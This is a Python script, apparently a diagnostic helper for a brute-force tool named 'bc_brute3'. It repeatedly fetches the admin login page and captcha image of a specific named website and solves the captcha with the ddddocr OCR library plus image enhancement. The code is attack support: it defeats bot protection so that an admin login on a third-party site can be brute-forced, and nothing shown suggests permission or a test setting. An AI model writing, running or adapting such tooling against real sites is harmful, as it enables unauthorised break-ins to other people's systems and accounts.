#!/usr/bin/env python3
"""bc_diag.py - diagnose bc_brute3 ocr-fail: what does try_login actually get"""
import urllib.request, urllib.parse, re, http.cookiejar, io, sys, time
from PIL import Image
import ddddocr

HOST = "http://075588866576.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
_OCR = ddddocr.DdddOcr(show_ad=False)

def ocr_enhance(img_bytes):
    try:
        t = _OCR.classification(img_bytes)
        if t and len(t) >= 4:
            return t.strip()
        img = Image.open(io.BytesIO(img_bytes)).convert("L")
        img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
        img = img.point(lambda x: 0 if x < 140 else 255)
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        t = _OCR.classification(buf.getvalue())
        return t.strip() if t and len(t) >= 4 else None
    except Exception as e:
        return "ERR:" + str(e)[:50]

def fetch(op, url, data=None, timeout=12, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return -1, url, str(ex).encode()

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
for i in range(5):
    code, final, body = fetch(op, HOST + "/admin/index.asp")
    code, final, cap = fetch(op, HOST + "/admin/vCode.asp",
                             headers={"Referer": HOST + "/admin/index.asp"})
    print("iter %d: index=%d cap=%d/%d head=%r" % (i, code, code, len(cap), cap[:10]))
    if code == 200 and len(cap) > 100:
        t = ocr_enhance(cap)
        print("  ocr:", repr(t))
        # also raw classification
        try:
            print("  raw:", repr(_OCR.classification(cap)))
        except Exception as e:
            print("  raw ERR:", repr(e)[:80])
    time.sleep(0.5)
